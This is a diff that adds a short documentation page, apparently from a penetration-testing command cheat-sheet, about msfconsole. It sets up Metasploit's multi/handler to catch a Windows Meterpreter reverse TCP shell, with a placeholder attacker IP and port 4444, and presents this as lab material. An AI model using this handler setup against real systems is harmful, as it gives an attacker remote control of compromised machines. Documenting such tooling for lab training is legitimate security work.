@@ -1,0 +1,37 @@
+---
+title: "msfconsole"
+sidebarTitle: "msfconsole"
+description: "Open Metasploit and configure a module."
+keywords: ["msfconsole", "metasploit"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/metasploit.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Replace UPPER_CASE values with your lab values.
+
+## Commands
+
+**Kali / msfconsole**
+
+```bash
+msfconsole -q
+# Inside msfconsole
+search smb
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST KALI_IP
+set LPORT 4444
+run
+```
+
+The handler must exactly match the payload and callback address/port you generated.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=msfconsole)
+
+## Learning and original examples
+
+- [Metasploit Framework: Startup to Sessions](/exploitation/metasploit-framework-cheat-sheet)
